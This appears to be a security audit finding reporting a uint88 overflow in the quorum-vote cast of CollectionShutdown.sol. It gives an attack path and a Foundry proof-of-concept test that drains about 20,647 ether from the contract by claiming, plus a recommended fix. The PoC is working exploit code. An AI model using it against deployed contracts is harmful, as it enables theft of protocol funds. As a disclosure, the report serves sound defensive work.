# [H] Quorum overflow in CollectionShutdown

## Summary
Severity: High
Contest weight: 0.9651

## Details
CollectionShutdown.sol#150 and CollectionShutdown.sol#L247 cast quorum votes to uint88 as follows:
```solidity
uint totalSupply = params.collectionToken.totalSupply();
if (totalSupply > MAX_SHUTDOWN_TOKENS * 10 ** params.collectionToken.denomination()) revert TooManyItems();
// Set our quorum vote requirement
params.quorumVotes = uint88(totalSupply * SHUTDOWN_QUORUM_PERCENT / ONE_HUNDRED_PERCENT);
```
The problem with the above is that it may overflow:
• collectionToken.denomination() may max 9
• MAX_SHUTDOWN_TOKENS==4
• SHUTDOWN_QUORUM_PERCENT/ONE_HUNDRED_PERCENT==1/2
• Collection tokens are minted in Locker as follows:
– token.mint(_recipient,tokenIdsLength*1ether*10**token.denomination());
E.g. with totalSupply==0.6190ether*10**9, we have that the check still passes, but:
• totalSupply*SHUTDOWN_QUORUM_PERCENT/ONE_HUNDRED_PERCENT=0.3095ether*10**9
• type(uint88).max =0.309485ether*10**9
• uint88(0.3095ether*10**9) =0.000015ether*10**9
Upon collection shutdown, tokens are sold on Sudoswap, and the funds thus obtained are distributed among the claimants. The claimed amount is then divided by quorumVotes as follows:
```solidity
uint amount = params.availableClaim * claimableVotes / (params.quorumVotes * ONE_HUNDRED_PERCENT / SHUTDOWN_QUORUM_PERCENT);
```
Thus, when dividing by a much smaller quorumVotes, the claimant receives much more than they are eligible for: in the PoC it's 20647ether though only 1ether has been received from sales.
CollectionShutdown.sol#150 and CollectionShutdown.sol#L247 downcast the quorum votes to uint88, which may overflow.
Internal pre-conditions
1. The collection token denomination needs to be sufficiently large to cause overflow
2. The amount of shutdown votes needs to be sufficiently large to cause overflow.
External pre-conditions
none
Attack Path
1. A user creates a collection with denomination 9
2. The user holding 0.6190ether*10**9 of the collection token (i.e. less than 1 NFT) starts collection shutdown.
• At that point the quorum of votes overflows, and becomes much smaller
3. Collection shutdown is executed normally.
4. Tokens are sold on Sudoswap.
• In the PoC they are sold for 1ether.
5. User claims the balance. Due to the overflow, they receive much more than what their NFTs were worth.
• In the PoC user receives 20647ether though only 1ether has been received from sales.
The protocol suffers unbounded losses (the whole balance of CollectionShutdown contract can be drained.

## Proof of Concept
Drop this test to CollectionShutdown.t.sol and execute with forge test --match-test test_QuorumOverflow:
```solidity
function test_QuorumOverflow() public {
    locker.createCollection(address(erc721c), 'Test Collection', 'TEST', 9);
    // Initialize our collection, without inflating `totalSupply` of the {CollectionToken}
    locker.setInitialized(address(erc721c), true);
    // Set our collection token for ease for reference in tests
    collectionToken = locker.collectionToken(address(erc721c));
    // Approve our shutdown contract to use test suite's tokens
    collectionToken.approve(address(collectionShutdown), type(uint).max);
    // Give some initial balance to CollectionShutdown contract
    vm.deal(address(collectionShutdown), 30000 ether);
    vm.startPrank(address(locker));
    // Suppose address(1) holds 0.6190 ether
    // in a collection token with denomination 9
    collectionToken.mint(address(1), 0.6190 ether * 10**9);
    vm.stopPrank();
    // Start collection shutdown from address(1)
    vm.startPrank(address(1));
    collectionToken.approve(address(collectionShutdown), 0.6190 ether * 10**9);
    collectionShutdown.start(address(erc721c));
    vm.stopPrank();
    // Mint NFTs into our collection {Locker} and process the execution
    uint[] memory tokenIds = _mintTokensIntoCollection(erc721c, 3);
    collectionShutdown.execute(address(erc721c), tokenIds);
    // Mock the process of the Sudoswap pool liquidating the NFTs for ETH.
    vm.startPrank(SUDOSWAP_POOL);
    // Transfer the specified tokens away from the Sudoswap position to simulate a purchase
    for (uint i; i < tokenIds.length; ++i) {
        erc721c.transferFrom(SUDOSWAP_POOL, address(5), i);
    }
    // Ensure the sudoswap pool has enough ETH to send
    deal(SUDOSWAP_POOL, 1 ether);
    // Send ETH from the Sudoswap Pool into the {CollectionShutdown} contract
    (bool sent,) = payable(address(collectionShutdown)).call{value: 1 ether}('');
    require(sent, 'Failed to send {CollectionShutdown} contract');
    vm.stopPrank();
    // Get our start balances so that we can compare to closing balances from claim
    uint startBalanceAddress = payable(address(1)).balance;
    // address(1) now can claim
    collectionShutdown.claim(address(erc721c), payable(address(1)));
    // Due to quorum overflow, address(1) now holds ~ 20647 ether
    assertApproxEqRel(payable(address(1)).balance - startBalanceAddress, 20647 ether, 0.01 ether);
}
```

## Recommendation
Employ the appropriate type and cast for quorumVotes, e.g. uint92.
